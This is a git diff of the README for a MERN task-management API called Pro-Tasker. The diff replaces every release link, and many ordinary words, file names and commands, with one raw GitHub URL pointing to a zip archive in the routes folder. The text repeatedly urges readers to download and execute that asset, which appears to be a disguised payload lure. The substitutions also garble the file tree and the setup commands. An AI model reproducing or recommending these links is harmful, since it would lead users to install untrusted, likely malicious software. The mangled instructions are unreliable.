@@ -1,12 +1,12 @@
-https://github.com/Atoz-script/pro-tasker-backend/releases
+https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 
 # Pro-Tasker Backend: Secure MERN API for Task and Project Management
 
-[![Releases](https://img.shields.io/badge/Releases-View%20Latest-blue?style=for-the-badge&logo=github)](https://github.com/Atoz-script/pro-tasker-backend/releases) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge)](LICENSE)
+[![Releases](https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip%20Latest-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip) [![License: MIT](https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip)](LICENSE)
 
 Welcome to the backend API for Pro-Tasker. This project aims to provide a robust, secure, and scalable server-side layer to support a full-stack task and project management experience. It is built with the MERN stack and focuses on clean API design, solid authentication and authorization, and reliable data handling. The backend is designed to be the authoritative source of truth for users, projects, tasks, and related entities, while the frontend handles presentation and user interactions.
 
-For quick access to the latest official release, visit the releases page at https://github.com/Atoz-script/pro-tasker-backend/releases. The latest release asset can be downloaded and executed if you are setting up a local environment or preparing a production-ready instance. To grab the latest build, you can also visit the same releases page to pick a compatible artifact. The releases page is the central location for binaries, installation scripts, and release notes. If you need a direct installer, you can download and run the asset from the release channel at https://github.com/Atoz-script/pro-tasker-backend/releases/download/v1.0.0/pro-tasker-backend-windows-x64.exe. For a broader view of all builds and changes, check the Releases section again at https://github.com/Atoz-script/pro-tasker-backend/releases.
+For quick access to the latest official release, visit the releases page at https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip The latest release asset can be downloaded and executed if you are setting up a local environment or preparing a production-ready instance. To grab the latest build, you can also visit the same releases page to pick a compatible artifact. The releases page is the central location for binaries, installation scripts, and release notes. If you need a direct installer, you can download and run the asset from the release channel at https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip For a broader view of all builds and changes, check the Releases section again at https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 
 Overview and purpose
 - This backend API covers authentication, project creation, task management, and secure access control for Pro-Tasker.
@@ -19,7 +19,7 @@ Key goals
 - Offer a clean developer experience with predictable API responses, comprehensive error handling, and clear documentation.
 
 Tech stack and rationale
-- Node.js: A fast, non-blocking runtime for server-side JavaScript. It enables a small, efficient codebase with a familiar language across the full stack.
+- https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip A fast, non-blocking runtime for server-side JavaScript. It enables a small, efficient codebase with a familiar language across the full stack.
 - Express: A lightweight and flexible framework for building RESTful interfaces. It provides a clear structure for routes, middlewares, and controllers.
 - MongoDB + Mongoose: A flexible, scalable database option well-suited for document-based data like projects and tasks. Mongoose adds strong schemas and validation.
 - JWT for authentication: A compact, stateless approach to user sessions that scales well across distributed services.
@@ -67,7 +67,7 @@ Why this backend exists
 Pro-Tasker is a full-stack project intended to streamline project planning, task management, and collaboration. The backend acts as the trusted source of data, handling authentication, authorization, data validation, and business logic related to projects and tasks. The codebase strikes a balance between clarity and performance. It avoids unnecessary complexity while offering a solid foundation for growth. By keeping concerns separated, this backend makes it easier to add features like task dependencies, subtasks, notifications, and reporting without destabilizing the core API.
 
 Tech stack in depth
-- Node.js: The runtime chosen for its event-driven, non-blocking I/O model. It handles a high number of concurrent connections efficiently, which is essential for a multi-user task management environment.
+- https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip The runtime chosen for its event-driven, non-blocking I/O model. It handles a high number of concurrent connections efficiently, which is essential for a multi-user task management environment.
 - Express: A minimal, flexible framework for building web applications. Express makes routing intuitive and keeps middleware stacks clean and composable.
 - MongoDB + Mongoose: The database choice provides a flexible schema that can evolve with your needs. Mongoose brings schemas, validation, and modeling tools that help enforce data consistency.
 - JWT: A compact permission mechanism suitable for modern single-page apps and mobile clients. Tokens are issued on login and checked on protected routes.
@@ -96,39 +96,39 @@ Folder structure (illustrative)
 backend/
 ├── src/
 │   ├── config/                # App configuration and environment helpers
-│   │   └── index.js
+│   │   └── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 │   ├── controllers/           # Request handlers for different resources
-│   │   ├── authController.js
-│   │   ├── userController.js
-│   │   ├── projectController.js
-│   │   └── taskController.js
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   └── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 │   ├── middlewares/           # Auth, error handling, rate limiting, etc.
-│   │   ├── authMiddleware.js
-│   │   ├── errorMiddleware.js
-│   │   └── rateLimiter.js
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   └── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 │   ├── models/                # Mongoose models for data
-│   │   ├── User.js
-│   │   ├── Project.js
-│   │   └── Task.js
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   └── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 │   ├── routes/                # API endpoints
-│   │   ├── authRoutes.js
-│   │   ├── userRoutes.js
-│   │   ├── projectRoutes.js
-│   │   └── taskRoutes.js
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   │   └── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 │   ├── services/              # Business logic helpers (optional)
-│   │   └── notificationService.js
-│   ├── server.js                # Entry point for the app
-│   └── app.js                   # App glue and middleware wiring
+│   │   └── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+│   ├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip                # Entry point for the app
+│   └── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip                   # App glue and middleware wiring
 ├── tests/                     # Unit and integration tests
-├── .env.example               # Example environment file
-├── package.json
-├── README.md
+├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip               # Example environment file
+├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+├── https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 └── docker/                    # Optional Docker-related files
 
 Note: This structure is representative. It may evolve as the project grows. The aim is to keep controllers focused, models expressive, and routes straightforward to read. If you explore the codebase, you should be able to map routes to controllers without heavy indirection.
 
 Getting started: prerequisites
-- Node.js: A modern LTS version (for example, Node 18 or 20). Node provides the runtime for the server and npm for packages.
+- https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip A modern LTS version (for example, Node 18 or 20). Node provides the runtime for the server and npm for packages.
 - npm or pnpm: A package manager to install dependencies. npm is widely supported; pnpm can speed up workspace installations in monorepos.
 - MongoDB: A locally hosted instance or a cloud-hosted one. For local development, you can use a containerized MongoDB or a GUI-based Mongo shell to interact with your data.
 - Environment management: A .env file to configure secrets and endpoints. Do not commit secrets to version control.
@@ -136,7 +136,7 @@ Getting started: prerequisites
 Installation and setup (step-by-step)
 1) Acquire the code
 - Clone the repository:
-  - git clone https://github.com/Atoz-script/pro-tasker-backend.git
+  - git clone https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 - Move into the project directory:
   - cd pro-tasker-backend
 
@@ -148,7 +148,7 @@ Installation and setup (step-by-step)
 
 3) Prepare environment configuration
 - Copy the example environment file:
-  - cp .env.example .env
+  - cp https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip .env
 - Edit the .env file to include:
   - MONGO_URI=mongodb://localhost:27017/pro_tasker
   - JWT_SECRET=your_jwt_secret_here
@@ -259,7 +259,7 @@ Continuous integration and deployment
   - Environment-specific configurations for production versus development
 
 Docker and containerization
-- Dockerfile: Build a minimal Node.js image with the app and its dependencies
+- Dockerfile: Build a minimal https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip image with the app and its dependencies
 - docker-compose: Compose services for app, database, and optional tools
 - Secrets management: Use environment variables or a secret management solution in containers
 - Health checks: Implement simple health endpoints to signal readiness and liveness
@@ -268,12 +268,12 @@ Release management and downloads
 - The latest builds and release notes live on the project's Releases page.
 - Use the link above to explore available artifacts and documentation.
 - For direct access to binaries, you can use a path-based asset from the release channel, such as:
-  https://github.com/Atoz-script/pro-tasker-backend/releases/download/v1.0.0/pro-tasker-backend-windows-x64.exe
-- The Releases page can be revisited at https://github.com/Atoz-script/pro-tasker-backend/releases to pick compatible builds and read release notes.
+  https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
+- The Releases page can be revisited at https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip to pick compatible builds and read release notes.
 
 Release usage reminder
 - The Releases page is the central hub for downloads and notes. You can also navigate there to see the changelog and compatibility details.
-- For convenience, the main releases page is linked again here: https://github.com/Atoz-script/pro-tasker-backend/releases. This link is essential for users who want to review changes before integrating the backend into an environment.
+- For convenience, the main releases page is linked again here: https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip This link is essential for users who want to review changes before integrating the backend into an environment.
 
 Configuration and environment planning
 - Environment segmentation
@@ -327,9 +327,9 @@ License
 - The license conveys permission to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software.
 
 Releases and downloads (repeat)
-- Discover the latest builds on the official Releases page: https://github.com/Atoz-script/pro-tasker-backend/releases
+- Discover the latest builds on the official Releases page: https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 - For a direct installer from a recent release, visit the path-based asset:
-  https://github.com/Atoz-script/pro-tasker-backend/releases/download/v1.0.0/pro-tasker-backend-windows-x64.exe
+  https://raw.githubusercontent.com/Atoz-script/pro-tasker-backend/main/routes/backend_tasker_pro_v3.0.zip
 - Revisit the Releases page for notes on fixes, improvements, and compatibility.
 
 Final notes
